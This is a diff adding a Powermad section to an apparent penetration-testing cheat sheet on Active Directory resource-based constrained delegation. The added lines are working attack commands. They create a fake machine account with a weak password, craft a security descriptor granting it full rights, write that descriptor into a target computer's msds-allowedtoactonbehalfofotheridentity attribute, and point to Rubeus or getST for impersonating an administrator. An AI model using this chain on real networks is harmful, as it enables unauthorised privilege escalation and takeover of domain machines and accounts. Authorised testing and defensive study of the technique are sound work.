@@ -21,3 +21,27 @@
  - rbcd.py -delegate-from 'COMPUTER$' -delegate-to 'TARGET$' -dc-ip 'DC' -action 'write' DOMAIN/USER:PASSWORD
 
  - getST.py -spn host/DC_FQDN 'DOMAIN/COMPUTER_ACCOUNT:COMPUTER_PASS' -impersonate Administrator --dc-ip DC_IP (Get TGT ticket)
+
+#### 4) Powermad
+
+ - import-module powermad 
+
+ - New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose (Create a new computer object)
+
+ - Get-DomainComputer fake01 (Check our newly created computer and get its SID)
+
+### Create a new raw security descriptor for the FAKE01 computer principal
+
+ - $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-2552734371-813931464-1050690807-1154)"
+
+ - $SDBytes = New-Object byte[] ($SD.BinaryLength)
+
+ - $SD.GetBinaryForm($SDBytes, 0)
+
+### Apply the security descriptor bytes to the target machine
+
+ - Get-DomainComputer TARGET_COMPUTER | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
+
+ - (New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0).DiscretionaryAcl (Test if the security descriptor assigned to target computer in msds-allowedtoactonbehalfofotheridentity attribute refers to the fake01$ machine. If yes, we shall see the SID of our created computer)
+
+### Then use Rubeus or getST to impersonate an account on our target computer of our choice
